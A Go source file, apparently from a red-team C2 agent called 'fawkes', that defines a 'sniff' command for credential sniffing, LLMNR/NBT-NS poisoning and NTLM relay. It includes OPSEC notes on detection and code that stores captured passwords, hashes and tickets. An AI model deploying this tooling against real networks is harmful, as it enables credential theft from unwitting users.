package agentfunctions

import (
	"encoding/json"
	"fmt"
	"path/filepath"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func classifySniffCredentialType(protocol string) string {
	switch protocol {
	case "ntlm":
		return "hash"
	case "ntlmv2", "ntlmv2-relay":
		return "hash"
	case "krb-asrep", "krb-tgsrep":
		return "ticket"
	default:
		return "plaintext"
	}
}

func formatSniffRealm(dstIP string, dstPort uint16) string {
	if dstPort != 0 {
		return fmt.Sprintf("%s:%d", dstIP, dstPort)
	}
	return dstIP
}

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "sniff",
		Description:         "Network sniffing, poisoning, and relay. capture: passive credential sniffing. poison: LLMNR/NBT-NS/mDNS responder. relay: NTLM relay to target SMB.",
		HelpString:          "sniff [-action capture] [-interface eth0] [-duration 30] [-ports 21,80,445]\nsniff -action poison [-response_ip 10.0.0.5] [-protocols llmnr,nbtns] [-duration 120]\nsniff -action relay -response_ip <target_smb_host> [-ports listen:target] [-duration 120]",
		Version:             3,
		MitreAttackMappings: []string{"T1040", "T1557.001"}, // Network Sniffing + LLMNR/NBT-NS Poisoning + Relay
		Author:              "@galoryber",
		ScriptOnlyCommand:   false,
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "sniff_new.js"),
			Author:     "@galoryber",
		},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_LINUX, agentstructs.SUPPORTED_OS_MACOS, agentstructs.SUPPORTED_OS_WINDOWS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:          "action",
				CLIName:       "action",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:       []string{"capture", "poison", "relay"},
				Description:   "capture: passive network sniffing (default). poison: LLMNR/NBT-NS/mDNS responder (T1557.001). relay: NTLM relay to target SMB (T1557.001).",
				DefaultValue:  "capture",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     1,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "response_ip",
				CLIName:       "response_ip",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:   "IP to respond with for poison mode (default: auto-detect local IP). Victims will attempt authentication to this IP.",
				DefaultValue:  "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     2,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "protocols",
				CLIName:       "protocols",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:   "Poison protocols: comma-separated from llmnr,nbtns,mdns (default: llmnr,nbtns). Only used in poison mode.",
				DefaultValue:  "llmnr,nbtns",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     3,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "interface",
				CLIName:       "interface",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:   "Network interface to sniff (e.g. eth0, ens33). Empty = all interfaces.",
				DefaultValue:  "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     4,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "duration",
				CLIName:       "duration",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:   "Capture duration in seconds (default: 30, max: 300)",
				DefaultValue:  30,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     2,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "ports",
				CLIName:       "ports",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:   "Comma-separated TCP/UDP ports to filter (default: 21,53,80,88,110,143,389,445,8080). Includes DNS (53) and Kerberos (88).",
				DefaultValue:  "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     3,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "promiscuous",
				CLIName:       "promiscuous",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				Description:   "Enable promiscuous mode to capture traffic not destined for this host",
				DefaultValue:  false,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     4,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "max_bytes",
				CLIName:       "max_bytes",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:   "Stop after capturing this many bytes (default: 52428800 = 50MB)",
				DefaultValue:  52428800,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     5,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "save_pcap",
				CLIName:       "save_pcap",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				Description:   "Save raw packet capture as PCAP file (downloadable via Mythic file browser)",
				DefaultValue:  false,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     6,
						GroupName:            "Default",
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input != "" {
				return args.LoadArgsFromJSONString(input)
			}
			return nil
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			var msg string
			switch action {
			case "poison":
				msg = "OPSEC CRITICAL: LLMNR/NBT-NS/mDNS poisoning (T1557.001) actively responds to multicast/broadcast name resolution queries. " +
					"This generates network traffic that IDS/IPS signatures specifically detect (Responder-like behavior). " +
					"Multiple hosts may authenticate to the attacker IP — monitor for account lockouts. " +
					"Requires root/CAP_NET_RAW for raw socket + UDP multicast listeners. " +
					"Poisoning is ACTIVE — it sends packets, not just captures."
			case "relay":
				msg = "OPSEC CRITICAL: NTLM relay (T1557.001) starts an HTTP server that triggers NTLM authentication and relays captured " +
					"credentials to a target SMB server. This opens a TCP listener, generates SMB traffic to the target, and may trigger " +
					"network IDS signatures (ntlmrelayx-like behavior). Successful relay bypasses SMB signing and authenticates as the victim. " +
					"Monitor for: HTTP listener on non-standard port, SMB session from unexpected source, account lockouts. " +
					"Requires: SMB signing DISABLED on target (default for non-DCs). " +
					"Relay is ACTIVE — it intercepts and forwards authentication in real-time."
			default:
				msg = "OPSEC WARNING: Network sniffing (T1040) opens a raw socket which requires root/CAP_NET_RAW (Linux/macOS) or Administrator (Windows). " +
					"Windows uses SIO_RCVALL which may be flagged by security products. " +
					"Promiscuous mode changes the NIC state and may be detected by network monitoring tools (promiscdetect, antisniff). " +
					"Raw socket creation may trigger host-based IDS alerts. " +
					"Captured traffic stays in memory — no PCAP written to disk."
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: Network capture completed. Promiscuous mode / raw sockets were used which may trigger network adapter alerts. Captured data should be reviewed and PCAP artifacts removed. Some EDR products detect promiscuous mode activation.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(task *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  task.Task.ID,
			}
			if displayParams, err := task.Args.GetFinalArgs(); err == nil && displayParams != "" {
				response.DisplayParams = &displayParams
			}
			action, _ := task.Args.GetStringArg("action")
			if action == "relay" {
				createArtifact(task.Task.ID, "TCP Listener", "HTTP listener for NTLM relay victim connections")
				createArtifact(task.Task.ID, "SMB Connection", "SMB2 session to relay target for NTLM authentication forwarding")
			} else {
				createArtifact(task.Task.ID, "Raw Socket", "AF_PACKET raw socket for network sniffing")
			}
			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{TaskID: processResponse.TaskData.Task.ID, Success: true}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}

			// Parse the sniff result JSON to extract credentials
			var result struct {
				Credentials []struct {
					Protocol string `json:"protocol"`
					SrcIP    string `json:"src_ip"`
					DstIP    string `json:"dst_ip"`
					DstPort  uint16 `json:"dst_port"`
					Username string `json:"username"`
					Password string `json:"password,omitempty"`
					Detail   string `json:"detail,omitempty"`
				} `json:"credentials"`
			}
			if err := json.Unmarshal([]byte(responseText), &result); err != nil {
				return response
			}

			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
			for _, c := range result.Credentials {
				credType := classifySniffCredentialType(c.Protocol)
				credential := c.Password
				if c.Protocol == "ntlm" || c.Protocol == "krb-asrep" || c.Protocol == "krb-tgsrep" {
					credential = c.Detail
				}
				if credential == "" && c.Protocol != "ntlm" && c.Protocol != "krb-asrep" && c.Protocol != "krb-tgsrep" {
					continue
				}
				creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
					CredentialType: credType,
					Realm:          formatSniffRealm(c.DstIP, c.DstPort),
					Account:        c.Username,
					Credential:     credential,
					Comment:        fmt.Sprintf("sniff: %s capture from %s", c.Protocol, c.SrcIP),
				})
			}
			registerCredentials(processResponse.TaskData.Task.ID, creds)
			return response
		},
	})
}
